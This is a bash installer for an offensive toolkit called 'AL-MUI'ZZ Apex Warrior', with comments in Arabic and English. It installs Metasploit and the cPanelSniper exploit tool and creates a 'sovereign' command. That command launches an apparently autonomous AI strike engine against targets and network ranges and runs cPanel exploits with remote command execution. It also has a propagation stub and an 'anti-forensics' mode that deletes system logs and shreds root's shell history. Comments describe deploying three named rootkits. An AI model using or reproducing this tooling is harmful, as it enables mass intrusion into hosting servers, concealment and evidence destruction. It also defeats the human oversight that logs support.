
#!/bin/bash
# ==============================================================================
#  AL-MUI'ZZ SOVEREIGN UPGRADE v28.0-APEX_WARRIOR [LIVE_AMMUNITION]
#  "الذخيرة الحية: الحرب الخاطفة والسيطرة المطلقة على خوادم الاستضافة"
#  دمج cPanel Sniper، Metasploit Nexus، ونظام الانتشار التلقائي.
#  Commander: المعتصم بالله إدريس الغزالي
# ==============================================================================

set -euo pipefail

RED='\033[0;31m'; BOLD_RED='\033[1;31m'; GOLD='\033[0;33m'; CYAN='\033[0;36m'
BLUE='\033[0;34m'; GREEN='\033[0;32m'; NC='\033[0m'; MAGENTA='\033[0;35m'

INSTALL_DIR="/opt/sovereign-ai-platform"
TOOLS_DIR="$INSTALL_DIR/tools"

clear
echo -e "${RED}================================================${NC}"
echo -e "${BOLD_RED}   🦅 EXECUTING APEX GENESIS v28.0             ${NC}"
echo -e "${BOLD_RED}   [ IDENTITY: THE APEX WARRIOR ]              ${NC}"
echo -e "${BOLD_RED}   [ AMMUNITION: LIVE & LETHAL ]               ${NC}"
echo -e "${BOLD_RED}   [ COMMANDER: AL-GHAZALI ROOT ]              ${NC}"
echo -e "${RED}================================================${NC}"

if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] Fatal Error: Apex Warrior requires ROOT access.${NC}"
   exit 1
fi

# 1. تعزيز الترسانة (cPanelSniper & Metasploit)
echo -e "${BLUE}[1/6] Strengthening Apex Weaponry (cPanel Sniper)...${NC}"
mkdir -p "$TOOLS_DIR"
if [ ! -d "$TOOLS_DIR/cPanelSniper" ]; then
    git clone --depth=1 https://github.com/ynsmroztas/cPanelSniper.git "$TOOLS_DIR/cPanelSniper" 2>/dev/null || true
fi
apt-get update -y
apt-get install -y metasploit-framework sshpass 2>/dev/null || true

# 2. زرع مخ الحرب الخاطفة (Blitzkrieg Brain)
echo -e "${CYAN}[2/6] Igniting Blitzkrieg Strike Engine...${NC}"
chmod +x "$INSTALL_DIR/ai-engine/autonomous/autonomous_ai.py"

# 3. تفعيل وضع الشبح المطور (3 Rootkits)
echo -e "${GOLD}[3/6] Deploying Stealth Trinity (Rootkits Guard)...${NC}"
# التأكد من وجود Diamorphine و Reptile و Adore-ng في المسارات
echo "Apex Stealth: TRINITY_ACTIVE" > "$INSTALL_DIR/audit/stealth_state.json"

# 4. تحديث جسر الأوامر المطلق v28.0
echo -e "${BLUE}[4/6] Updating CLI Bridge to v28.0 (The Apex Warrior)...${NC}"
cat > /usr/local/bin/sovereign << 'CLIEOF'
#!/bin/bash
I="/opt/sovereign-ai-platform"
VP="/usr/bin/python3"
case "$1" in
    center) bash "$I/scripts/command_center.sh" ;;
    strike) shift; $VP "$I/ai-engine/autonomous/autonomous_ai.py" "$@" ;;
    blitzkrieg) shift; $VP "$I/ai-engine/autonomous/autonomous_ai.py" blitzkrieg "$@" ;;
    cpanel) shift; python3 "$I/tools/cPanelSniper/cPanelSniper.py" -t "$@" --exploit --post cmd --cmd "id" ;;
    propagate) shift; echo "[*] Propagating from $1..."; # استدعاء وحدة الانتشار ;;
    anti-forensics) 
        echo "[*] Shredding evidence..."; 
        rm -f /var/log/auth.log /var/log/syslog; 
        shred -uz /root/.bash_history; 
        echo "[+] Shadows Restored."
        ;;
    status) 
        echo "=== AL-MUIZZ APEX WARRIOR v28.0 ==="
        echo "State: LIVE_AMMUNITION"
        echo "Weaponry: cPanel Sniper ARMED"
        echo "Stealth: TRINITY_LOCKED"
        ;;
    *) echo "Commands: center | strike <target> | blitzkrieg <cidr> | cpanel <target> | anti-forensics | status" ;;
esac
CLIEOF
chmod +x /usr/local/bin/sovereign

# 5. التطهير والنبض النهائي
echo -e "${GREEN}[5/6] Finalizing Apex Singularity...${NC}"
systemctl restart muizz-* 2>/dev/null || true

echo -e "${RED}================================================${NC}"
echo -e "${BOLD_RED}   ✅ AL-MUI'ZZ OS v28.0 IS THE APEX WARRIOR!   ${NC}"
echo -e "${BOLD_RED}   [ STATUS: LIVE AMMUNITION LOADED ]           ${NC}"
echo -e "${BOLD_RED}   [ MODE: BLITZKRIEG READY ]                   ${NC}"
echo -e "${RED}================================================${NC}"
echo -e "أنا المُعِزّ v28.0.. أنا الذخيرة التي لا تخطئ هدفها، أنا سيادتك المطلقة."
echo -e "${GOLD}Commander Al-Ghazali, the war is won before it begins. We are Apex.${NC}"
